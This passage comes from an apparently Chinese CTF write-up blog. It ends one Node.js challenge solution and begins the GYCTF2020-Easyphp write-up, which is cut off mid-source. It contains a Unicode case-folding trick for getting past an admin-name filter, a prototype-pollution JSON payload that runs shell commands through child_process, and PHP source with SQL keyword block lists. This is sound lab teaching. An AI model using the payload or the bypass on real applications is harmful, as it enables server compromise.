class="hljs-punctuation">&#123;</span><br>      a<span class="hljs-punctuation">[</span><span class="hljs-built_in">attr</span><span class="hljs-punctuation">]</span> <span class="hljs-operator">=</span> b<span class="hljs-punctuation">[</span><span class="hljs-built_in">attr</span><span class="hljs-punctuation">]</span>;<br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-built_in">return</span> a<br><span class="hljs-punctuation">&#125;</span><br>const clone <span class="hljs-operator">=</span> <span class="hljs-punctuation">(</span>a<span class="hljs-punctuation">)</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-built_in">return</span> merge<span class="hljs-punctuation">(</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> a<span class="hljs-punctuation">)</span>;<br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>往下在<code>/action</code>的路由中找到<code>clone()</code>的位置</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">router.post(<span class="hljs-string">&#x27;/action&#x27;</span>, <span class="hljs-keyword">function</span> (req, res) &#123;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-keyword">session</span>.<span class="hljs-keyword">user</span>.<span class="hljs-keyword">user</span>!=&quot;ADMIN&quot;)&#123;res.<span class="hljs-keyword">end</span>(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; <br>  req.<span class="hljs-keyword">session</span>.<span class="hljs-keyword">user</span>.data = clone(req.body);<br>  res.<span class="hljs-keyword">end</span>(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);  <br>&#125;);<br></code></pre></td></tr></table></figure><p>需要ADMIN账号才能用到<code>clone()</code></p><p>于是去看<code>/login</code>路由的源码，主要看注册时对用户名的判断</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(safeKeyword(req.body.userid)</span></span>)&#123;<br>    res<span class="hljs-selector-class">.end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) <br>   &#125;<br></code></pre></td></tr></table></figure><p>传入的userid经过了<code>safeKeyword</code>函数，看下这个函数</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">safeKeyword</span>(keyword) &#123;<br>  if(keyword.match(/(admin)/<span class="hljs-keyword">is</span>)) &#123;<br>      <span class="hljs-keyword">return</span> keyword<br>  &#125;<br></code></pre></td></tr></table></figure><p>这里是通过正则来过滤掉admin(大小写)，不过有个地方可以注意到<br><code>&#39;user&#39;:req.body.userid.toUpperCase()</code><br>这里用<code>toUpperCase</code>将user给转为大写了，这种转编码的通常都很容易出问题，于是测试一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-keyword">var</span> arr  = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>();</span><br><span class="language-javascript">            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">26</span>;i++)&#123;</span><br><span class="language-javascript">                arr[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>();</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">65536</span>;i++)&#123;</span><br><span class="language-javascript">                j = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(i).<span class="hljs-title function_">toUpperCase</span>();</span><br><span class="language-javascript">                <span class="hljs-keyword">if</span>(j.<span class="hljs-property">length</span> == <span class="hljs-number">1</span>)&#123;</span><br><span class="language-javascript">                    c = j.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>);</span><br><span class="language-javascript">                    <span class="hljs-keyword">if</span>(c&gt;<span class="hljs-number">64</span>&amp;&amp;c&lt;<span class="hljs-number">91</span>)&#123;</span><br><span class="language-javascript">                        l = arr[c-<span class="hljs-number">65</span>].<span class="hljs-property">length</span>;</span><br><span class="language-javascript">                        arr[c-<span class="hljs-number">65</span>][l] = i;</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">26</span>;i++)&#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;p&gt;&quot;</span>+<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(i+<span class="hljs-number">65</span>)+<span class="hljs-string">&quot;:&lt;/p&gt;&quot;</span>);</span><br><span class="language-javascript">                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;p&gt;&quot;</span>);</span><br><span class="language-javascript">                <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>;j &lt; arr[i].<span class="hljs-property">length</span>;j++)&#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(arr[i][j]+<span class="hljs-string">&quot;,&quot;</span>);</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">I</span>:<br><span class="hljs-attribute">73</span>,<span class="hljs-number">105</span>,<span class="hljs-number">305</span>,<br><span class="hljs-attribute">S</span>:<br><span class="hljs-attribute">83</span>,<span class="hljs-number">115</span>,<span class="hljs-number">383</span>,<br></code></pre></td></tr></table></figure><p>I和S都有3个值能够toUpperCase()后为自身，除了大小写外还有其它toUpperCase()后能为I和S。那正好利用I的第三个值去绕过正则检测并在toUpperCase()后为I<br>当然toUpperCase()有转码的问题toLowerCase()也有，可以改一下去测试（不过不要用edge测）<br>参考文章Fuzz中的javascript大小写特性</p><p>能登入为admin账号后，就该开始找要污染的参数</p><p>注册admın（此admın非彼admin，仔细看i部分）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">特殊字符绕过<br><span class="hljs-function"><span class="hljs-title">toUpperCase</span><span class="hljs-params">()</span></span><br><br>其中混入了两个奇特的字符<span class="hljs-string">&quot;ı&quot;</span>、<span class="hljs-string">&quot;ſ&quot;</span>。<br><br>​ 这两个字符的“大写”是I和S。也就是说<span class="hljs-string">&quot;ı&quot;</span><span class="hljs-selector-class">.toUpperCase</span>() == <span class="hljs-string">&#x27;I&#x27;</span>，<span class="hljs-string">&quot;ſ&quot;</span><span class="hljs-selector-class">.toUpperCase</span>() == <span class="hljs-string">&#x27;S&#x27;</span>。通过这个小特性可以绕过一些限制。<br><span class="hljs-function"><span class="hljs-title">toLowerCase</span><span class="hljs-params">()</span></span><br><br>这个<span class="hljs-string">&quot;K&quot;</span>的“小写”字符是k，也就是<span class="hljs-string">&quot;K&quot;</span><span class="hljs-selector-class">.toLowerCase</span>() == <span class="hljs-string">&#x27;k&#x27;</span>.<br></code></pre></td></tr></table></figure><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">router.get(<span class="hljs-string">&#x27;/info&#x27;</span>, <span class="hljs-keyword">function</span> <span class="hljs-params">(req, res)</span> &#123;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);<br>&#125;)<br><br></code></pre></td></tr></table></figure><p>可以看到在&#x2F;info下，使用将outputFunctionName渲染入index中，而outputFunctionName是未定义的</p><p>res.outputFunctionName&#x3D;undefined;</p><p>也就是可以通过污染outputFunctionName进行SSTI</p><p>于是抓&#x2F;action的包，Content-Type设为application&#x2F;json<br>payload:</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">&#123;<span class="hljs-string">&quot;lua&quot;</span>:<span class="hljs-type"></span>&quot;a<span class="hljs-string">&quot;,&quot;</span>__proto__<span class="hljs-string">&quot;:&#123;&quot;</span>outputFunctionName<span class="hljs-string">&quot;:&quot;</span>a=<span class="hljs-number">1</span>;<span class="hljs-keyword">return</span> global.process.mainModule.constructor<span class="hljs-number">._</span>load(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)<span class="hljs-comment">//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</span><br></code></pre></td></tr></table></figure><p>再访问&#x2F;info就可以下载到flag文件</p>]]></content>
      
      
      
        <tags>
            
            <tag> js代码审计 </tag>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020-Easyphp</title>
      <link href="/2025/04/27/GYCTF2020-Easyphp/"/>
      <url>/2025/04/27/GYCTF2020-Easyphp/</url>
      
        <content type="html"><![CDATA[<h1 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="GYCTF2020-Easyphp"></a>GYCTF2020-Easyphp</h1><p><a href="https://www.jianshu.com/p/21b5dd45724c">参考借鉴wp</a></p><p>启动靶机并访问，一进去是一个登录页面</p><p><img src="/../image/GYCTF2020-Easyphp-1.png"></p><p>先尝试了一下弱口令登录，不行，然后又猜测存在register注册页面，也没有，然后访问了下<a href="http://www.zip发现可以下载网页源码/">www.zip发现可以下载网页源码</a></p><p>login.php</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>login<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;login.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>百万前端的用户信息管理系统<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>半成品系统 留后门的程序员已经跑路<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;UserName&quot;</span> <span class="hljs-attr">required</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: 20&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">required</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top:20;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;img/1.jpg&#x27;</span>&gt;</span>大家记得做好防护<span class="hljs-tag">&lt;/<span class="hljs-name">img</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-variable">$user</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>();</span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="language-php">    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br&gt;Damn you, hacker!&quot;</span>);</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="language-php">    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Damn you, hacker!&quot;</span>);</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>();</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><p>update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;html&gt;</span><br><span class="hljs-string">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="hljs-string">&lt;title&gt;update&lt;/title&gt;</span><br><span class="hljs-string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span><br><span class="hljs-string">&lt;/html&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]!=<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你还没有登陆呢！&quot;</span>;<br>&#125;<br><span class="hljs-variable">$users</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$users</span>-&gt;<span class="hljs-title function_ invoke__">update</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]===<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><hr><p>lib.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params"><span class="hljs-variable">$parm</span></span>)</span>&#123;<br>    <span class="hljs-variable">$array</span>= <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;regexp&#x27;</span>,<span class="hljs-string">&#x27;load&#x27;</span>,<span class="hljs-string">&#x27;into&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;insert&#x27;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;alter&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$array</span>,<span class="hljs-string">&#x27;hacker&#x27;</span>,<span class="hljs-variable">$parm</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$mysqli</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dbCtrl</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;id=<span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-string">&#x27;select id,password from user where username=?&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;id)&#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]=<span class="hljs-variable language_">$this</span>-&gt;id;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你的ID是&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你好！&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;id;<br>        &#125;<br>    &#125;<br>&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$Info</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getNewinfo</span>());<br>        <span class="hljs-variable">$age</span>=<span class="hljs-variable">$Info</span>-&gt;age;<br>        <span class="hljs-variable">$nickname</span>=<span class="hljs-variable">$Info</span>-&gt;nickname;<br>        <span class="hljs-variable">$updateAction</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateHelper</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>],<span class="hljs-variable">$Info</span>,<span class="hljs-string">&quot;update user SET age=<span class="hljs-subst">$age</span>,nickname=<span class="hljs-subst">$nickname</span> where id=&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br>        <span class="hljs-comment">//这个功能还没有写完 先占坑</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNewInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$age</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;age&#x27;</span>];<br>        <span class="hljs-variable">$nickname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">safe</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Info</span>(<span class="hljs-variable">$age</span>,<span class="hljs-variable">$nickname</span>)));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;nickname);<span class="hljs-comment">//危</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;nickname-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$this</span>-&gt;age);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0-0&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$CtrlCase</span>;<br>    <span 